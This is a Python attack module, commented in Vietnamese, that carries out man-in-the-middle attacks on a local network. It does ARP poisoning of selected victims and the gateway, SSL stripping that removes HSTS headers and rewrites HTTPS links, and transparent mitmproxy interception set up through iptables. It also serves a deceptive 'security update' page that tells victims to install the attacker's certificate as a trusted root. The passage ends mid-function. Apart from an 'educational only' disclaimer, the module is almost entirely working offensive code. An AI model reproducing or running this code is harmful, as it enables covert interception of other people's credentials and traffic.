#!/usr/bin/env python3
"""
Man-in-the-Middle (MitM) Attack Module - Phiên bản tối ưu hóa
Thực hiện tấn công ARP Poisoning để xen vào giữa hai thiết bị.
*** CẢNH BÁO: CHỈ SỬ DỤNG CHO MỤC ĐÍCH GIÁO DỤC VÀ NGHIÊN CỨU. ***
"""

import threading
import time
import os
import socket
import logging
import netifaces
import json
import sys
import ssl
import struct
import re
import subprocess
import shutil
import http.server
import socketserver
from typing import Optional, Dict, List
from colorama import Fore, Style

try:
    from netfilterqueue import NetfilterQueue
except ImportError:
    NetfilterQueue = None
from scapy.all import Ether, ARP, srp, sendp, sniff, IP, TCP, UDP, Raw
from . import utils  # Import module utils
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

def get_local_ip(interface: str) -> Optional[str]:
    """Lấy địa chỉ IP của máy đang chạy script trên interface được chỉ định.

    Hàm này thử lấy địa chỉ IPv4 được gán cho một interface mạng cụ thể.
    Nó ưu tiên sử dụng thư viện `netifaces` để có kết quả chính xác,
    sau đó fallback về phương pháp sử dụng socket nếu `netifaces` thất bại.

    Args:
        interface: Tên của interface mạng (ví dụ: 'eth0', 'wlan0').

    Returns:
        Một chuỗi chứa địa chỉ IP nếu thành công, ngược lại trả về None.
    """
    try:
        # Sử dụng netifaces để lấy IP local
        addrs = netifaces.ifaddresses(interface)
        if netifaces.AF_INET in addrs:
            return addrs[netifaces.AF_INET][0]['addr']
    except Exception:
        pass

    # Fallback: sử dụng socket
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except Exception:
        return None

def get_mac(ip: str, interface: str, retries: int = 3, timeout: int = 2) -> Optional[str]:
    """Lấy địa chỉ MAC của một IP trong mạng LAN với cơ chế retry.

    Gửi một gói tin ARP request đến địa chỉ IP mục tiêu để phân giải
    địa chỉ MAC tương ứng. Hàm này sẽ thử lại nếu không nhận được
    phản hồi trong khoảng thời gian chờ.

    Args:
        ip: Địa chỉ IP của thiết bị mục tiêu.
        interface: Tên interface mạng để gửi gói tin (ví dụ: 'eth0').
        retries: Số lần thử lại tối đa nếu không nhận được phản hồi.
        timeout: Thời gian chờ (giây) cho mỗi lần thử.

    Returns:
        Một chuỗi chứa địa chỉ MAC nếu thành công, ngược lại trả về None.
    """
    for i in range(retries):
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), 
                        timeout=timeout, iface=interface, verbose=0)
            if ans:
                return ans[0][1].hwsrc
            logging.warning(f"Không nhận được phản hồi ARP từ {ip} (lần thử {i+1}/{retries})")
        except Exception as e:
            logging.error(f"Lỗi khi lấy MAC của {ip} (lần thử {i+1}/{retries}): {e}")

        if i < retries - 1:
            time.sleep(1) # Chờ 1 giây trước khi thử lại

    return None

def get_network_info(interface: str) -> Dict:
    """Lấy thông tin mạng chi tiết của một interface.

    Sử dụng thư viện `netifaces` để truy xuất địa chỉ IP, netmask, và
    địa chỉ broadcast của interface được chỉ định.

    Args:
        interface: Tên của interface mạng (ví dụ: 'eth0').

    Returns:
        Một dictionary chứa thông tin mạng ('ip', 'netmask', 'broadcast').
        Trả về một dictionary rỗng nếu có lỗi xảy ra.
    """
    try:
        addrs = netifaces.ifaddresses(interface)
        if netifaces.AF_INET in addrs:
            ip_info = addrs[netifaces.AF_INET][0]
            return {
                'ip': ip_info['addr'],
                'netmask': ip_info['netmask'],
                'broadcast': ip_info.get('broadcast', '')
            }
    except Exception as e:
        logging.error(f"Lỗi khi lấy thông tin mạng: {e}")
    return {}

class MitmAttacker:
    """
    Lớp thực hiện tấn công Man-in-the-Middle (MitM) tối ưu hóa.
    """
    
    def __init__(self, interface: str, victim_ips: List[str], gateway_ip: str,
                 enable_sniffing: bool = True, poison_interval: int = 2,
                 enable_ssl_stripping: bool = False,
                 enable_ssl_interception: bool = False,
                 enable_violent_mode: bool = False):
        """Khởi tạo MitM attacker.

        Args:
            interface: Tên interface mạng.
            victim_ips: Danh sách IP của các nạn nhân.
            gateway_ip: IP của gateway (router).
            enable_sniffing: Bật packet sniffing.
            poison_interval: Khoảng thời gian gửi ARP poison (giây).
            enable_ssl_stripping: Bật SSL Stripping (yêu cầu netfilterqueue).
            enable_ssl_interception: Bật SSL Interception (yêu cầu mitmproxy).
            enable_violent_mode: Bật chế độ chặn các domain lớn (yêu cầu mitmproxy).
        """
        self.interface = interface
        self.victim_ips = victim_ips
        self.gateway_ip = gateway_ip
        self.poison_interval = poison_interval
        self.enable_sniffing = enable_sniffing
        self.enable_ssl_stripping = enable_ssl_stripping
        self.enable_ssl_interception = enable_ssl_interception
        self.enable_violent_mode = enable_violent_mode

        if self.enable_ssl_stripping and NetfilterQueue is None:
            raise ImportError("Thư viện 'netfilterqueue' là bắt buộc cho SSL Stripping. Vui lòng cài đặt: pip install netfilterqueue")
        
        self.attacker_ip = get_local_ip(interface)
        if not self.attacker_ip:
            raise ValueError(f"Không thể lấy IP local trên interface {interface}")
        
        # Cơ chế điều khiển
        self.stop_event = threading.Event()
        self.threads = []
        self.mitmdump_path = self._find_mitmdump_path()
        self.mitmproxy_process = None
        self.mitmproxy_script_path = None # Thêm thuộc tính này
        self.cert_delivery_server = None
        self.queue = None # For NetfilterQueue

        self.stats = {
            'arp_packets_sent': 0,
            'packets_intercepted': 0,
            'http_requests': 0,
            'dns_queries': 0,
            'start_time': None,
        }
        self.stats_lock = threading.Lock()
        
        # MAC addresses
        self.victim_macs: Dict[str, str] = {}
        self.gateway_mac = None
        
        # IP forwarding state
        self.original_ip_forward = self._get_ip_forward_state()
        
        # Lấy logger đã được cấu hình sẵn từ root
        self.logger = logging.getLogger(__name__)

        if (self.enable_ssl_interception or self.enable_violent_mode) and not self.mitmdump_path:
            error_msg = "Công cụ 'mitmproxy' là bắt buộc cho SSL Interception. Vui lòng cài đặt: pip install mitmproxy"
            self.logger.error(error_msg)
            raise ImportError(error_msg)

        
    def _select_targets_from_menu(self, available_targets: List[str], prompt: str) -> Optional[List[str]]:
        """Hiển thị menu để người dùng chọn một hoặc nhiều mục tiêu.

        Hàm này tải thông tin thiết bị từ database, hiển thị một danh sách
        các mục tiêu có sẵn và cho phép người dùng chọn một, nhiều, hoặc
        tất cả các mục tiêu để tấn công.

        Args:
            available_targets: Danh sách các địa chỉ IP có sẵn để lựa chọn.
            prompt: Chuỗi tiêu đề để hiển thị cho menu lựa chọn.

        Returns:
            Một danh sách các địa chỉ IP đã được người dùng chọn, hoặc None nếu
            người dùng hủy bỏ.
        """
        print("0. Tấn công tất cả các mục tiêu trong danh sách")
        print(f"\n=== {prompt.upper()} ===")
        devices_info = utils.load_device_database(self.logger)
            
        for i, ip in enumerate(available_targets, 1):
            device_info = devices_info.get(ip, {})
            hostname = device_info.get('hostname', 'Unknown')
            vendor = device_info.get('mac_vendor', device_info.get('vendor', 'Unknown'))
            os_info = device_info.get('os', 'Unknown')
            device_type = device_info.get('device_type', 'Unknown')
            risk_level = device_info.get('security_info', {}).get('risk_level', 'low')
            
            # Hiển thị thông tin chi tiết hơn
            print(f"{i}. {ip} - {hostname}")
            print(f"   📱 {vendor} | {os_info} | {device_type.title()} | Risk: {risk_level.upper()}")
        
        while True:
            try:
                choice_str = input(f"\nChọn mục tiêu (ví dụ: 1,3,5 hoặc 0 cho tất cả): ")
                if not choice_str.strip():
                    continue
                
                if choice_str.strip() == '0':
                    self.logger.info(f"Đã chọn tấn công tất cả {len(available_targets)} mục tiêu.")
                    return available_targets

                choices = [int(c.strip()) for c in choice_str.split(',')]
                selected_ips = []
                for choice in choices:
                    if 1 <= choice <= len(available_targets):
                        selected_ips.append(available_targets[choice - 1])
                
                if selected_ips:
                    self.logger.info(f"Đã chọn các mục tiêu: {', '.join(selected_ips)}")
                    return selected_ips
                else:
                    print("Lựa chọn không hợp lệ. Vui lòng thử lại.")
            except ValueError:
                print("Vui lòng nhập số.")
        
    def _find_mitmdump_path(self) -> Optional[str]:
        """Tìm đường dẫn tuyệt đối đến file thực thi 'mitmdump'.

        Hàm này rất quan trọng khi chạy script với `sudo`, vì `sudo` có thể
        reset biến môi trường PATH, làm cho các lệnh thông thường không
        tìm thấy file thực thi. Nó sẽ ưu tiên tìm trong thư mục `bin` của
        môi trường ảo (virtual environment) hiện tại trước khi tìm trong
        PATH của hệ thống.

        Returns:
            Một chuỗi chứa đường dẫn tuyệt đối đến 'mitmdump' nếu tìm thấy,
            ngược lại trả về None.
        """
        # 1. Kiểm tra trong cùng thư mục bin của python interpreter hiện tại (cho venv)
        venv_path = os.path.join(os.path.dirname(sys.executable), 'mitmdump')
        if os.path.exists(venv_path) and os.access(venv_path, os.X_OK):
            return venv_path
        # 2. Nếu không có, kiểm tra trong PATH hệ thống
        system_path = shutil.which('mitmdump')
        return system_path

    def _start_ca_delivery_server(self, host_ip: str, port: int = 8001):
        """Khởi động một web server đơn giản để cung cấp chứng chỉ CA.

        Server này phục vụ một trang HTML hướng dẫn người dùng cách cài đặt
        chứng chỉ CA của mitmproxy và cung cấp file chứng chỉ để tải về.
        Điều này rất hữu ích khi thực hiện tấn công SSL Interception.

        Args:
            host_ip: Địa chỉ IP mà server sẽ lắng nghe.
            port: Cổng mà server sẽ lắng nghe.
        """
        
        ca_path = os.path.expanduser("~/.mitmproxy/mitmproxy-ca-cert.pem")
        if not os.path.exists(ca_path):
            self.logger.error(f"Không tìm thấy chứng chỉ CA tại: {ca_path}")
            self.logger.error("Vui lòng chạy mitmproxy hoặc mitmdump một lần để tạo chứng chỉ, sau đó thử lại.")
            return

        html_content = f"""
<!DOCTYPE html><html lang="vi"><head><meta charset="UTF-8"><title>Cài đặt Chứng chỉ Bảo mật</title>
<style>body{{font-family:sans-serif;line-height:1.6;padding:2em;max-width:800px;margin:auto;background-color:#f4f4f4;color:#333}}.container{{background-color:#fff;padding:2em;border-radius:8px;box-shadow:0 0 10px rgba(0,0,0,0.1)}}h1{{color:#d9534f}}a{{color:#0275d8;text-decoration:none;font-weight:bold}}.button{{display:inline-block;padding:10px 20px;background-color:#5cb85c;color:#fff;border-radius:5px;text-align:center}}.warning{{border-left:5px solid #f0ad4e;padding:10px;background-color:#fcf8e3}}</style>
</head><body><div class="container"><h1>Cập nhật Cấu hình Bảo mật Mạng</h1>
<p class="warning"><b>Lưu ý:</b> Để đảm bảo kết nối an toàn và truy cập đầy đủ các dịch vụ nội bộ, bạn cần cài đặt chứng chỉ bảo mật của chúng tôi.</p>
<h2>Bước 1: Tải Chứng chỉ</h2><p>Nhấp vào nút bên dưới để tải file chứng chỉ về thiết bị của bạn.</p>
<p><a href="/cert.pem" class="button">Tải Chứng chỉ (mitmproxy-ca-cert.pem)</a></p>
<h2>Bước 2: Cài đặt Chứng chỉ</h2><p>Sau khi tải về, hãy làm theo hướng dẫn cho hệ điều hành của bạn:</p>
<h3>Windows</h3><ol><li>Mở file <b>cert.pem</b> vừa tải.</li><li>Nhấp vào "Install Certificate...".</li><li>Chọn "Current User" rồi nhấp "Next".</li><li>Chọn "Place all certificates in the following store", nhấp "Browse...".</li><li>Chọn <b>"Trusted Root Certification Authorities"</b>, nhấp "OK" rồi "Next".</li><li>Nhấp "Finish". Đồng ý với cảnh báo bảo mật nếu có.</li></ol>
<h3>Android</h3><ol><li>Vào <b>Cài đặt > Bảo mật > Các cài đặt bảo mật khác > Cài đặt từ bộ nhớ thiết bị</b>.</li><li>Chọn <b>Chứng chỉ CA</b> (có thể yêu cầu nhập mã PIN hoặc mật khẩu màn hình khóa).</li><li>Chọn file <b>cert.pem</b> bạn vừa tải về.</li></ol>
<h3>iOS (iPhone/iPad)</h3><ol><li>Tải file chứng chỉ (trình duyệt sẽ hiển thị thông báo "Profile Downloaded").</li><li>Vào <b>Cài đặt > Đã tải về hồ sơ</b> (General > Profile Downloaded).</li><li>Nhấp vào "Install" ở góc trên bên phải và làm theo hướng dẫn.</li><li><b>Quan trọng:</b> Sau khi cài, vào <b>Cài đặt > Cài đặt chung > Giới thiệu > Cài đặt tin cậy chứng nhận</b> (General > About > Certificate Trust Settings).</li><li>Bật công tắc cho chứng chỉ <b>mitmproxy</b>.</li></ol>
<p>Sau khi hoàn tất, hãy thử tải lại trang web bạn đang truy cập.</p></div></body></html>
        """

        class CAHandler(http.server.SimpleHTTPRequestHandler):
            def log_message(self, format, *args):
                pass # Ghi đè để không in log ra console

            def do_GET(self):
                if self.path == '/':
                    self.send_response(200)
                    self.send_header("Content-type", "text/html; charset=utf-8")
                    self.end_headers()
                    self.wfile.write(html_content.encode('utf-8'))
                elif self.path == '/cert.pem':
                    try:
                        with open(ca_path, 'rb') as f:
                            self.send_response(200)
                            self.send_header("Content-type", "application/x-x509-ca-cert")
                            self.send_header("Content-Disposition", "attachment; filename=mitmproxy-ca-cert.pem")
                            self.end_headers()
                            self.wfile.write(f.read())
                    except FileNotFoundError:
                        self.send_error(404, "File Not Found: cert.pem")
                else:
                    self.send_error(404, "File Not Found")

        try:
            httpd = socketserver.ThreadingTCPServer((host_ip, port), CAHandler)
            self.cert_delivery_server = httpd
            server_thread = threading.Thread(target=httpd.serve_forever, daemon=True, name="CADeliveryServer")
            server_thread.start()
            self.logger.info(f"✅ Server hỗ trợ cài đặt CA đã khởi động.")
            self.logger.info(f"   Nói nạn nhân truy cập: {Fore.CYAN}http://{host_ip}:{port}{Style.RESET_ALL}")
        except OSError as e:
            self.logger.error(f"Lỗi khi khởi động server CA tại {host_ip}:{port}: {e}")
            self.logger.error("Cổng có thể đang được sử dụng.")
        except Exception as e:
            self.logger.error(f"Lỗi không xác định khi khởi động server CA: {e}")

    def _log_subprocess_output(self, pipe, log_func):
        """Đọc và ghi log output từ một tiến trình con (subprocess).

        Hàm này được thiết kế để chạy trong một thread riêng, liên tục đọc
        từng dòng output từ stdout hoặc stderr của một tiến trình con và
        chuyển nó đến một hàm logging được chỉ định.

        Args:
            pipe: Đối tượng pipe (ví dụ: `process.stdout`) để đọc output.
            log_func: Hàm logging để gọi với mỗi dòng output (ví dụ: `logger.info`).
        """
        try:
            # Sử dụng iter để đọc từng dòng một cách an toàn
            for line in iter(pipe.readline, b''):
                log_func(f"[mitmproxy] {line.decode('utf-8', errors='ignore').strip()}")
        except Exception as e:
            self.logger.error(f"Lỗi khi đọc output từ mitmproxy: {e}")
        finally:
            pipe.close()

    def _get_ip_forward_state(self) -> str:
        """Kiểm tra và trả về trạng thái IP forwarding hiện tại của hệ thống.

        Đọc file `/proc/sys/net/ipv4/ip_forward` trên Linux để xác định
        xem IP forwarding đang được bật ('1') hay tắt ('0').

        Returns:
            Chuỗi '1' nếu IP forwarding đang bật, '0' nếu đang tắt hoặc
            không thể xác định.
        """
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
                return f.read().strip()
        except Exception:
            return "0"

    def _set_ip_forward(self, state: str) -> bool:
        """Bật hoặc t trên hệ thống Linux.

        Ghi giá trị '1' (bật) hoặc '0' (tắt) vào file
        `/proc/sys/net/ipv4/ip_forward`. Yêu cầu quyền root để thực hiện.

        Args:
            state: Chuỗi '1' để bật hoặc '0' để tắt IP forwarding.

        Returns:
            True nếu thao tác thành công, False nếu thất bại (ví dụ: không có quyền)
        
        ắt IP forwarding."""
        if os.geteuid() != 0:
            self.logger.warning("Cần quyền root để thay đổi IP forwarding.")
            return False
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write(state)
            self.logger.info(f"IP forwarding đã được đặt thành: {state}")
            return True
        except Exception as e:
            self.logger.error(f"Lỗi khi thay đổi IP forwarding: {e}")
            return False

    def _setup_ssl_strip_rules(self):
        """Cấu hình iptables để chuyển hướng traffic cho SSL Stripping."""
        self.logger.info("Cấu hình iptables cho SSL Stripping...")
        # Chuyển hướng các gói tin đi qua (FORWARD chain) trên cổng 80 vào queue số 1
        os.system("iptables -F") # Flush old rules
        os.system("iptables -t nat -F")
        os.system("iptables -I FORWARD -p tcp --dport 80 -j NFQUEUE --queue-num 1")
        self.logger.info("Đã thêm quy tắc iptables.")

    def _setup_ssl_intercept_rules(self):
        """Cấu hình iptables để chuyển hướng traffic cho SSL Interception (mitmproxy)."""
        self.logger.info("Cấu hình iptables cho SSL Interception...")
        os.system("iptables -F") # Flush old rules
        os.system("iptables -t nat -F")
        # Chuyển hướng traffic HTTPS (443) đến cổng của mitmproxy (mặc định 8080)
        os.system("iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080")
        os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080")
        self.logger.info("Đã thêm quy tắc iptables NAT để chuyển hướng cổng 80 và 443 đến 8080.")

        """Dọn dẹp các quy tắc iptables."""
        self.logger.info("Dọn dẹp các quy tắc iptables cho SSL Strip...")
        # Xóa các quy tắc đã thêm.
        os.system("iptables -D FORWARD -p tcp --dport 80 -j NFQUEUE --queue-num 1")
        self.logger.info("Đã dọn dẹp iptables.")

    def _ssl_strip_packet_processor(self, packet):
        """Xử lý gói tin để thực hiện SSL strip."""
        scapy_packet = IP(packet.get_payload())
        if scapy_packet.haslayer(Raw) and scapy_packet.haslayer(TCP):
            # Chỉ xử lý các gói tin HTTP response (từ server về client)
            if scapy_packet[TCP].sport == 80 and scapy_packet[IP].dst in self.victim_ips:
                try:
                    payload = scapy_packet[Raw].load.decode('utf-8', errors='ignore')
                    
                    # Xóa header HSTS để trình duyệt không tự động chuyển sang HTTPS
                    payload = re.sub(r"Strict-Transport-Security:.*\r\n", "", payload, flags=re.IGNORECASE)
                    
                    # Thay thế link https:// bằng http://
                    payload = payload.replace("https://", "http://")
                    
                    # Thay thế Location header trong các redirect
                    payload = re.sub(r"Location: https://", "Location: http://", payload, flags=re.IGNORECASE)

                    scapy_packet[Raw].load = payload.encode('utf-8')
                    
                    # Scapy sẽ tự tính lại checksum và len khi gói tin được build lại
                    del scapy_packet[IP].len
                    del scapy_packet[IP].chksum
                    del scapy_packet[TCP].chksum
                    
                    packet.set_payload(bytes(scapy_packet))
                    with self.stats_lock:
                        self.stats['http_requests'] += 1 # Đếm là một request đã xử lý
                    self.logger.info(f"Đã thực hiện SSL Strip trên gói tin từ {scapy_packet[IP].src} đến {scapy_packet[IP].dst}")
                except Exception as e:
                    self.logger.debug(f"Lỗi khi xử lý gói tin SSL Strip: {e}")
        
        packet.accept() # Chấp nhận và cho gói tin đi tiếp (dù có sửa đổi hay không)

    def _resolve_single_mac(self, ip: str, device_db: Dict) -> Optional[str]:
        """Phân giải MAC cho một mục tiêu, ưu tiên từ DB rồi mới ARP scan."""
        # 1. Ưu tiên lấy từ DB
        device_info = device_db.get(ip)
        if device_info and device_info.get('mac_address'):
            mac = device_info['mac_address']
            self.logger.debug(f"Tìm thấy MAC của {ip} trong DB: {mac}")
            return mac

        # 2. Nếu không có trong DB, thực hiện ARP scan
        self.logger.debug(f"Không tìm thấy MAC của {ip} trong DB, đang gửi ARP request...")
        return get_mac(ip, self.interface)

    def _resolve_targets(self) -> bool:
        """Phân giải MAC của nạn nhân và gateway, ưu tiên từ DB."""
        self.logger.info(f"Đang phân giải MAC của {len(self.victim_ips)} nạn nhân và gateway...")
        device_db = utils.load_device_database(self.logger)

        # Resolve victim MACs in parallel
        with ThreadPoolExecutor(max_workers=10) as executor:
            future_to_ip = {executor.submit(self._resolve_single_mac, ip, device_db): ip for ip in self.victim_ips}
            for future in as_completed(future_to_ip):
                ip = future_to_ip[future]
                try:
                    mac = future.result()
                    if mac:
                        self.victim_macs[ip] = mac
                        self.logger.info(f"✓ Nạn nhân: {ip} -> {mac}")
                    else:
                        self.logger.warning(f"✗ Không thể phân giải MAC của nạn nhân: {ip}")
                except Exception as e:
                    self.logger.error(f"✗ Lỗi khi phân giải MAC của nạn nhân {ip}: {e}")
        if not self.victim_macs:
            self.logger.error("Không phân giải được MAC cho bất kỳ nạn nhân nào.")
            return False
        # Resolve gateway MAC
        self.gateway_mac = self._resolve_single_mac(self.gateway_ip, device_db)
        if not self.gateway_mac:
            self.logger.error(f"Không tìm thấy MAC của gateway {self.gateway_ip}")
            return False
        self.logger.info(f"✓ Gateway: {self.gateway_ip} -> {self.gateway_mac}")
        return True

    def _poison_loop(self):
        """Vòng lặp gửi các gói tin ARP giả mạo."""
        self.logger.info("Bắt đầu vòng lặp ARP poisoning...")
        
        while not self.stop_event.is_set():
            try:
                packets_to_send = []
                for victim_ip, victim_mac in self.victim_macs.items():
                    # Lừa victim: nói rằng IP của gateway có MAC của attacker
                    packet_to_victim = ARP(op=2, pdst=victim_ip, psrc=self.gateway_ip, hwdst=victim_mac)
                    # Lừa gateway: nói rằng IP của victim có MAC của attacker
                    packet_to_gateway = ARP(op=2, pdst=self.gateway_ip, psrc=victim_ip, hwdst=self.gateway_mac)
                    packets_to_send.extend([packet_to_victim, packet_to_gateway])

                if packets_to_send:
                    sendp(packets_to_send, iface=self.interface, verbose=0)
                    with self.stats_lock:
                        self.stats['arp_packets_sent'] += len(packets_to_send)
                    
                time.sleep(self.poison_interval)
                
            except Exception as e:
                self.logger.error(f"Lỗi trong vòng lặp ARP poison: {e}")
                break
                
        self.logger.info("Đã dừng vòng lặp ARP poisoning.")

    def _process_packet(self, packet):
        """Hàm callback để xử lý mỗi gói tin bắt được."""
        with self.stats_lock:
            self.stats['packets_intercepted'] += 1
            # Thêm logic phân tích chi tiết ở đây
            # Ví dụ: đếm request HTTP/DNS
            if packet.haslayer(TCP) and (packet[TCP].dport == 80 or packet[TCP].sport == 80):
                self.stats['http_requests'] += 1
            if packet.haslayer(UDP) and (packet[UDP].dport == 53 or packet[UDP].sport == 53):
                self.stats['dns_queries'] += 1

        # In ra thông tin gói tin (có thể bật/tắt)
        # self.logger.debug(f"Intercepted: {packet.summary()}")

    def _sniff_loop(self):
        """Vòng lặp bắt và xử lý các gói tin một cách an toàn."""
        self.logger.info("Bắt đầu nghe lén lưu lượng mạng...")
        # Xây dựng bộ lọc để bắt gói tin từ tất cả các nạn nhân
        filter_str = "ip and not arp and (host " + " or host ".join(self.victim_ips) + ")"
        sniff(
            filter=filter_str,
            prn=self._process_packet,
            iface=self.interface,
            store=0,  # Không lưu gói tin vào bộ nhớ để tiết kiệm RAM
            stop_filter=lambda p: self.stop_event.is_set() # ĐIỂM MẤU CHỐT
        )
        self.logger.info("Đã dừng nghe lén.")

    def _monitor_attack(self):
        """Giám sát và hiển thị thống kê tấn công."""
        while not self.stop_event.is_set():
            time.sleep(10)  # Hiển thị thống kê mỗi 10 giây
            
            with self.stats_lock:
                elapsed = time.time() - self.stats['start_time'] if self.stats['start_time'] else 0
                
                self.logger.info(
                    f"📊 Thống kê MitM: {self.stats['packets_intercepted']} gói tin, "
                    f"{self.stats['arp_packets_sent']} ARP packets, "
                    f"{self.stats['http_requests']} HTTP requests, "
                    f"{self.stats['dns_queries']} DNS queries"
                )
 
    def _restore_arp(self):
        """Khôi phục lại bảng ARP của các mục tiêu."""
        if not self.victim_macs or not self.gateway_mac:
            return
            
        self.logger.info("Đang khôi phục bảng ARP...")
        packets_to_send = []
        for victim_ip, victim_mac in self.victim_macs.items():
            # Gửi broadcast để khôi phục ARP cho victim
            packet_to_victim = ARP(
                op=2, pdst=victim_ip, psrc=self.gateway_ip, 
                hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gateway_mac
            )
            # Gửi broadcast để khôi phục ARP cho gateway
            packet_to_gateway = ARP(
                op=2, pdst=self.gateway_ip, psrc=victim_ip, 
                hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac
            )
            packets_to_send.extend([packet_to_victim, packet_to_gateway])
        
        for _ in range(5):  # Gửi 5 lần để đảm bảo
            sendp(packets_to_send, iface=self.interface, verbose=0)
            time.sleep(0.5)
            
        self.logger.info("Khôi phục ARP hoàn tất.")

    def start_attack(self) -> bool:
        """Bắt đầu cuộc tấn công MitM."""
        self.logger.info(f"Bắt đầu tấn công MitM vào {len(self.victim_ips)} nạn nhân...")
        
        # Hiển thị thông tin mạng
        network_info = get_network_info(self.interface)
        if network_info:
            self.logger.info(f"Interface {self.interface}: {network_info['ip']}/{network_info['netmask']}")
        
        # Phân giải MAC
        if not self._resolve_targets():
            return False
        
        # Bật IP forwarding
        if not self._set_ip_forward("1"):
            self.logger.warning("Không thể bật IP forwarding. Tấn công có thể làm gián đoạn mạng.")
        
        # Cấu hình SSL Strip nếu được bật
        if self.enable_ssl_stripping:
            self._setup_ssl_strip_rules()
            self.queue = NetfilterQueue()
            self.queue.bind(1, self._ssl_strip_packet_processor)
            # Chạy queue trong một thread riêng
            queue_thread = threading.Thread(target=self.queue.run, daemon=True, name="NetfilterQueue")
            self.threads.append(queue_thread)
            queue_thread.start()
        
        # Cấu hình SSL Intercept nếu được bật
        if self.enable_ssl_interception:
            self._setup_ssl_intercept_rules()
            logfile = f"logs/mitm_ssl_capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
            
            # Ưu tiên script tùy chỉnh (cho MitB), sau đó đến chế độ bạo lực, cuối cùng là mặc định
            if self.mitmproxy_script_path:
                self.logger.info(f"Khởi động mitmdump với script tùy chỉnh: {self.mitmproxy_script_path}")
                mitm_command = [self.mitmdump_path, '--mode', 'transparent', '--showhost', '-s', self.mitmproxy_script_path]
            elif self.enable_violent_mode:
                blocker_script_path = os.path.join(os.path.dirname(__file__), 'mitm_blocker.py')
                self.logger.info(f"Khởi động mitmdump ở chế độ BẠO LỰC, sử dụng script: {blocker_script_path}")
                mitm_command = [self.mitmdump_path, '--mode', 'transparent', '--showhost', '-s', blocker_script_path]
            else:
                self.logger.info(f"Khởi động mitmdump (từ {self.mitmdump_path}), lưu lượng sẽ được ghi vào: {logfile}")
                mitm_command = [self.mitmdump_path, '--mode', 'transparent', '--showhost', '-w', logfile]

            # Khởi chạy mitmproxy và bắt output
            self.mitmproxy_process = subprocess.Popen(
                mitm_command, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE
            )

            # Tạo và khởi động các luồng để log output của mitmproxy, giúp debug dễ dàng hơn
            stdout_thread = threading.Thread(
                target=self._log_subprocess_output, args=(self.mitmproxy_process.stdout, self.logger.info),
                daemon=True, name="MitmproxyStdout"
            )
            stderr_thread = threading.Thread(
                target=self._log_subprocess_output, args=(self.mitmproxy_process.stderr, self.logger.error),
                daemon=True, name="MitmproxyStderr"
            )
            stdout_thread.start()
            stderr_thread.start()
            # Thêm vào self.threads để theo dõi, dù chúng là daemon
            self.threads.extend([stdout_thread, stderr_thread])

        self.stop_event.clear()
        self.stats['start_time'] = time.time()
        
        # Khởi động các threads
        threads_to_start = [
            (self._poison_loop, "ARP Poison"),
            (self._monitor_attack, "Monitor")
        ]
        
        # Thêm luồng sniffing nếu được bật
        if self.enable_sniffing:
            threads_to_start.append((self._sniff_loop, "Sniffer"))

        for func, name in threads_to_start:
            thread = threading.Thread(target=func, daemon=True, name=name)
            self.threads.append(thread)
            thread.start()
            
        self.logger.info(f"Tấn công đã bắt đầu với {len(self.threads)} threads. Nhấn CtrlC để dừng.")
        return True

    def stop_attack(self):
        """Dừng tấn công MitM và khôi phục ARP tables."""
        self.logger.info("🛑 Đang dừng tấn công MitM...")
        self.stop_event.set()

        # Dừng mitmproxy process trước. Gửi SIGTERM để nó có cơ hội dọn dẹp.
        if self.mitmproxy_process:
            self.logger.info("Đang dừng tiến trình mitmproxy...")
            self.mitmproxy_process.terminate() # Gửi SIGTERM
            # Đợi process kết thúc. Output của nó sẽ được log bởi các thread logger.
            self.mitmproxy_process.wait(timeout=5)

        # Dừng server CA
        if self.cert_delivery_server:
            self.logger.info("Đang dừng server hỗ trợ cài đặt CA...")
            # Chạy shutdown trong một thread riêng để tránh deadlock
            shutdown_thread = threading.Thread(target=self.cert_delivery_server.shutdown)
            shutdown_thread.start()
            self.cert_delivery_server.server_close()

        # Dừng NetfilterQueue trước để tránh lỗi
        if self.enable_ssl_stripping and self.queue:
            self.logger.info("Đang dừng NetfilterQueue...")
            self.queue.unbind() # Ngừng nhận gói tin
            self.logger.info("NetfilterQueue đã dừng.")
        
        # Dừng các threads
        for thread in self.threads:
            # Không cần join các thread logger của mitmproxy vì chúng sẽ tự kết thúc khi pipe đóng
            if "Mitmproxy" in thread.name:
                continue
            thread.join(timeout=2)
        self.threads.clear()
        
        # Dọn dẹp iptables
        self.logger.info("Dọn dẹp tất cả các quy tắc iptables...")
        os.system("iptables -F")
        os.system("iptables -t nat -F")

        # Khôi phục ARP tables
        self._restore_arp()
        
        # Khôi phục IP forwarding
        self._set_ip_forward(self.original_ip_forward)

    def get_stats(self) -> Dict:
        """Lấy thống kê hiện tại của cuộc tấn công.

        Returns:
            Một dictionary chứa các thông tin thống kê về cuộc tấn công,
            chẳng hạn như số gói tin đã gửi/bắt được.
        """
        with self.stats_lock:
            return self.stats.copy()
    
    def is_attacking(self) -> bool:
        """Kiểm tra xem có đang tấn công không."""
        return not self.stop_event.is_set()

def run_mitm_attack(interface: str, **kwargs):
    """
    Hàm tiện ích để chạy tấn công MitM với menu lựa chọn.
    
    :param interface: Interface mạng
    :param kwargs: Các tham số khác cho MitmAttacker
    """
    try:
        print("\n=== MITM ATTACK MODULE ===")
        # Dummy attacker để truy cập các hàm tiện ích
        dummy_attacker = MitmAttacker(interface, ["127.0.0.1"], "127.0.0.1")
        
        # 1. Tải danh sách mục tiêu
        all_targets = utils.load_targets_from_scan(dummy_attacker.logger, dummy_attacker.attacker_ip, exclude_router=False, exclude_attacker=True)
        if not all_targets:
            print("[-] Không tìm thấy thiết bị nào. Vui lòng chạy 'scan' trước.")
            return
        
        # 2. Chọn nạn nhân (victim)
        victim_targets = [t for t in all_targets if not t.endswith('.1')]
        if not victim_targets:
